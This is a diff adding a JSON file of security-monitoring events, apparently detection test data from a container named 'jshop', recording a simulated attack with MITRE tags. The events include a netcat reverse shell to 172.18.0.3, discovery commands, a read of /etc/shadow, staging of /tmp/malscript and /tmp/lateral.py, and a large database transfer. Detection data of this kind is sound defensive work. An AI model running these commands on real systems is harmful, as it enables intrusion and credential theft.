@@ -1,0 +1,819 @@
+[
+    {
+        "@timestamp": "2021-11-29T10:32:40.803778263Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:40.803778263Z",
+            "kind": "event",
+            "reason": "Node process starts shell",
+            "severity": 2,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:40.803778263Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "-c nc 172.18.0.3 4445 -w 30 -e /bin/sh",
+            "command_line": "/bin/sh -c nc 172.18.0.3 4445 -w 30 -e /bin/sh",
+            "executable": "/bin/sh",
+            "name": "sh",
+            "parent": {
+                "args": "build/app",
+                "command_line": "/usr/local/bin/node build/app",
+                "executable": "/usr/local/bin/node",
+                "name": "node",
+                "pid": 583124,
+                "start": "2021-11-29T10:22:33.014809828Z"
+            },
+            "pid": 588994,
+            "start": "2021-11-29T10:32:40.795864502Z",
+            "thread": {
+                "id": 588994
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1059.004"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:32:40.805372967Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:40.805372967Z",
+            "kind": "event",
+            "reason": "Reverse Unix shell started",
+            "severity": 2,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:40.805372967Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "172.18.0.3 4445 -w 30 -e /bin/sh",
+            "command_line": "/usr/bin/nc 172.18.0.3 4445 -w 30 -e /bin/sh",
+            "executable": "/usr/bin/nc",
+            "name": "nc",
+            "parent": {
+                "args": "build/app",
+                "command_line": "/usr/local/bin/node build/app",
+                "executable": "/usr/local/bin/node",
+                "name": "node",
+                "pid": 583124,
+                "start": "2021-11-29T10:22:33.014809828Z"
+            },
+            "pid": 588994,
+            "start": "2021-11-29T10:32:40.795864502Z",
+            "thread": {
+                "id": 588994
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1059.004"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:32:40.808674176Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:40.808674176Z",
+            "kind": "event",
+            "reason": "Node process starts shell",
+            "severity": 2,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:40.808674176Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "",
+            "command_line": "/bin/sh ",
+            "executable": "/bin/sh",
+            "name": "sh",
+            "parent": {
+                "args": "build/app",
+                "command_line": "/usr/local/bin/node build/app",
+                "executable": "/usr/local/bin/node",
+                "name": "node",
+                "pid": 583124,
+                "start": "2021-11-29T10:22:33.014809828Z"
+            },
+            "pid": 588994,
+            "start": "2021-11-29T10:32:40.795864502Z",
+            "thread": {
+                "id": 588994
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1059.004"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:32:40.982690952Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:40.982690952Z",
+            "kind": "event",
+            "reason": "System Owner/User Discovery",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:40.982690952Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "",
+            "command_line": "/usr/bin/id ",
+            "executable": "/usr/bin/id",
+            "name": "id",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 588995,
+            "start": "2021-11-29T10:32:40.980900361Z",
+            "thread": {
+                "id": 588995
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1033"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:32:45.073675885Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:45.073675885Z",
+            "kind": "event",
+            "reason": "System Information Discovery",
+            "severity": 0,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:45.073675885Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "-a",
+            "command_line": "/bin/uname -a",
+            "executable": "/bin/uname",
+            "name": "uname",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589007,
+            "start": "2021-11-29T10:32:45.072438461Z",
+            "thread": {
+                "id": 589007
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1082"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:32:51.837303587Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:51.837303587Z",
+            "kind": "event",
+            "reason": "Process Discovery",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:51.837303587Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "-ef",
+            "command_line": "/bin/ps -ef",
+            "executable": "/bin/ps",
+            "name": "ps",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589017,
+            "start": "2021-11-29T10:32:51.835982887Z",
+            "thread": {
+                "id": 589017
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1057"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:32:56.332101886Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:32:56.332101886Z",
+            "kind": "event",
+            "reason": "File and Directory Discovery",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:32:56.332101886Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "-h",
+            "command_line": "/bin/df -h",
+            "executable": "/bin/df",
+            "name": "df",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589029,
+            "start": "2021-11-29T10:32:56.330834189Z",
+            "thread": {
+                "id": 589029
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1083"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:33:02.389963683Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:33:02.389963683Z",
+            "kind": "event",
+            "reason": "System Network Connections Discovery",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:33:02.389963683Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "-nl",
+            "command_line": "/bin/netstat -nl",
+            "executable": "/bin/netstat",
+            "name": "netstat",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589048,
+            "start": "2021-11-29T10:33:02.388905925Z",
+            "thread": {
+                "id": 589048
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1049"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:33:08.324836762Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:33:08.324836762Z",
+            "kind": "event",
+            "reason": "Account Discovery - Local Account",
+            "severity": 2,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:33:08.324836762Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "/etc/shadow",
+            "command_line": "/bin/cat /etc/shadow",
+            "executable": "/bin/cat",
+            "name": "cat",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589059,
+            "start": "2021-11-29T10:33:08.322803848Z",
+            "thread": {
+                "id": 589059
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1087.001"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:33:20.998943079Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:33:20.998943079Z",
+            "kind": "event",
+            "reason": "Remote System Discovery",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:33:20.998943079Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "/etc/hosts",
+            "command_line": "/bin/cat /etc/hosts",
+            "executable": "/bin/cat",
+            "name": "cat",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589077,
+            "start": "2021-11-29T10:33:20.996977993Z",
+            "thread": {
+                "id": 589077
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1018"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:33:27.290536458Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:33:27.290536458Z",
+            "kind": "event",
+            "reason": "File and Directory Discovery",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:33:27.290536458Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "",
+            "command_line": "/bin/mount ",
+            "executable": "/bin/mount",
+            "name": "mount",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589085,
+            "start": "2021-11-29T10:33:27.288878375Z",
+            "thread": {
+                "id": 589085
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1083"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:33:47.689807908Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:33:47.689807908Z",
+            "kind": "event",
+            "reason": "Linux and Mac File and Directory Permissions Modification",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:33:47.689807908Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "+x /tmp/malscript",
+            "command_line": "/bin/chmod +x /tmp/malscript",
+            "executable": "/bin/chmod",
+            "name": "chmod",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589127,
+            "start": "2021-11-29T10:33:47.688669406Z",
+            "thread": {
+                "id": 589127
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1222.002"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:34:01.638365128Z",
+        "ecs": {},
+        "event": {
+            "action": "network-connection-traffic",
+            "category": "network",
+            "duration": 245680793,
+            "end": "2021-11-29T10:34:01.884045921Z",
+            "kind": "event",
+            "reason": "Large network data transfer with database endpoint",
+            "severity": 2,
+            "sf_type": "NF",
+            "start": "2021-11-29T10:34:01.638365128Z",
+            "type": "connection"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "network": {
+            "bytes": 767074,
+            "community_id": "1:AGLxLhmV1j6l/V9ezr1tKdoQfa0=",
+            "iana_number": "6",
+            "protocol": "tcp"
+        },
+        "source": {
+            "address": "172.18.0.4",
+            "bytes": 426,
+            "ip": "172.18.0.4",
+            "packets": 8,
+            "port": 35876
+        },
+        "destination": {
+            "address": "172.18.0.2",
+            "bytes": 766648,
+            "ip": "172.18.0.2",
+            "packets": 106,
+            "port": 3306
+        },
+        "process": {
+            "args": "/tmp/malscript",
+            "command_line": "/tmp/malscript /tmp/malscript",
+            "executable": "/tmp/malscript",
+            "name": "malscript",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589158,
+            "start": "2021-11-29T10:34:00.761022578Z",
+            "thread": {
+                "id": 589158
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1030"
+        ]
+    },
+    {
+        "@timestamp": "2021-11-29T10:34:18.209751089Z",
+        "ecs": {},
+        "event": {
+            "action": "process-start",
+            "category": "process",
+            "duration": 0,
+            "end": "2021-11-29T10:34:18.209751089Z",
+            "kind": "event",
+            "reason": "Linux and Mac File and Directory Permissions Modification",
+            "severity": 1,
+            "sf_ret": 0,
+            "sf_type": "PE",
+            "start": "2021-11-29T10:34:18.209751089Z",
+            "type": "start"
+        },
+        "container": {
+            "id": "9c63d0d5a829",
+            "image": {
+                "id": "e7bba4e190a679d0f100e7333c96cd40e9fda24b6efd9bca7f678a474b9951dd",
+                "name": "testenv/jshop:latest"
+            },
+            "name": "jshop",
+            "runtime": "DOCKER",
+            "sf_privileged": false
+        },
+        "process": {
+            "args": "+x /tmp/lateral.py",
+            "command_line": "/bin/chmod +x /tmp/lateral.py",
+            "executable": "/bin/chmod",
+            "name": "chmod",
+            "parent": {
+                "args": "",
+                "command_line": "/bin/sh",
+                "executable": "/bin/sh",
+                "name": "sh",
+                "pid": 588994,
+                "start": "2021-11-29T10:32:40.795864502Z"
+            },
+            "pid": 589195,
+            "start": "2021-11-29T10:34:18.208371538Z",
+            "thread": {
+                "id": 589195
+            }
+        },
+        "user": {
+            "group": {
+                "id": 1001,
+                "name": ""
+            },
+            "id": 1001,
+            "name": ""
+        },
+        "tags": [
+            "mitre:T1222.002"
+        ]
+    }
+]
